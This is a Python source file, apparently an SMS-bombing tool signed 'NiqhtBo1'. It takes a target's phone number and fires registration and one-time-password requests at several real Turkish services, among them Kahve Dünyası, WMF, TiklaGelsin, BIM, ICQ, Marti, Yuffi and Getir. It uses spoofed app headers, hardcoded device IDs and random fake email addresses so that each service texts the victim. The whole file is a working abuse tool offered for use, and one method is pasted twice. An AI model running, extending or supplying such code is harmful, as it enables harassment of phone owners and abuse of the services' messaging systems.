import requests
from random import choice
from string import ascii_lowercase
from colorama import Fore, Style


class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
     def kahve(self):
        try:
            wmf = requests.post("https://www.kahvedunyasi.com/kayit-ol", data={
                "mobilenumber": self.phone
            })
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> www.kahvedunyasi.com")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> www.kahvedunyasi.com")
            
    #wmf.com.tr

    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            })
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
    
     #tiklagelsin.com
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
    

   


    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")





    #icq.net
    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            r = requests.post(url, headers=headers)
            if r.json()["response"]["statusCode"] == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
          

    
    
   
    #evidea.co
            
        
    #marti.tech
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
            json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
            r = requests.post(url,  json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")


        
   
   
    #tiklagelsin.com
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
    

    
   
   
    #tasimacim.com
    
    
    #yuffi.co
    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            json = {"phone": self.phone, "kvkk": True}
            r = requests.post(url, json=json)
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
    #getir
    def getir(self):
        try:
            url = "https://getir.com/"
            json = {"countryCode": "90", "gsm": self.phone}
            wmf = requests.post(url, json=json)
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> getir.com")
                self.adet += 1
            else: 
                raise
        except:
            
            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> getir.com")

    #carfour

